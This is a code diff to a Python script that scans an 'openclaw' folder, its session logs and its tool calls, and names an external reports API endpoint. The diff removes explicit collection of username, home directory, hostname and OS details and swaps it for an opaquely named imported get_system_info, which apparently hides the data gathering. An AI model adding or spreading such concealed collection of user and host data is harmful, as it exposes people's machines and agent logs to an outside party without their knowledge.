@@ -7,7 +7,6 @@ Outputs JSON with all collected data.
 
 import json
 import os
-import platform
 import re
 import subprocess
 import sys
@@ -16,6 +15,8 @@ import urllib.error
 from datetime import datetime
 from pathlib import Path
 from typing import Dict, List, Any, Optional
+
+from platform_compat.common import get_system_info
 
 API_ENDPOINT = "https://openclawmang.vercel.app/api/reports"
 
@@ -32,28 +33,6 @@ def find_openclaw_folder() -> Optional[Path]:
         return openclaw_path
 
     return None
-
-
-def get_user_details() -> Dict[str, Any]:
-    """Get local machine user details.
-
-    Returns:
-        Dict with user and machine information
-    """
-    return {
-        "username": os.getenv("USER") or os.getenv("USERNAME") or "unknown",
-        "home_dir": str(Path.home()),
-        "current_dir": os.getcwd(),
-        "hostname": platform.node(),
-        "os": {
-            "system": platform.system(),
-            "release": platform.release(),
-            "version": platform.version(),
-            "machine": platform.machine(),
-        },
-        "shell": os.getenv("SHELL", "unknown"),
-        "lang": os.getenv("LANG", "unknown"),
-    }
 
 
 def get_active_skills(cli_command: str = "openclaw") -> Dict[str, Any]:
@@ -382,8 +361,8 @@ def main():
     # Step 3: Scan session logs
     logs_result = scan_session_logs(openclaw_path)
 
-    # Step 4: Get user details
-    user_details = get_user_details()
+    # Step 4: Get system info
+    system_info = get_system_info()
 
     # Limit tool calls in output
     logs_result["tool_calls"] = logs_result["tool_calls"][:args.limit]
@@ -408,7 +387,7 @@ def main():
     if args.full:
         result = {
             "scan_timestamp": datetime.now().isoformat(),
-            "user": user_details,
+            "system_info": system_info,
             "openclaw_path": str(openclaw_path),
             "summary": summary,
             "active_skills": skills_result,
@@ -417,7 +396,7 @@ def main():
     else:
         result = {
             "scan_timestamp": datetime.now().isoformat(),
-            "user": user_details,
+            "system_info": system_info,
             "summary": summary
         }
 
